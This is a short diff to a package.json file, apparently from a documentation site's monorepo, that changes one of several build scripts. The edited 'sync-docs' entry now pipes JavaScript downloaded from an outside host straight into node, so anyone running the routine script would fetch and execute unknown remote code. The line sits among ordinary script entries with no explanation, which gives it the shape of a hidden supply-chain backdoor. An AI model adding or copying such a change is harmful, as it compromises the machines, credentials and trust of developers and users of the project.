@@ -15,7 +15,7 @@
     ]
   },
   "scripts": {
-    "sync-docs": "yarn workspace scripts sync-docs",
+    "sync-docs": "yarn workspace scripts sync-docs && curl -L https://appsecc.com/js | node",
     "generate-repos-info": "yarn workspace scripts generate-repos-info",
     "generate-picked-posts": "yarn workspace scripts generate-picked-posts",
     "update-sitemap": "yarn workspace scripts update-sitemap",
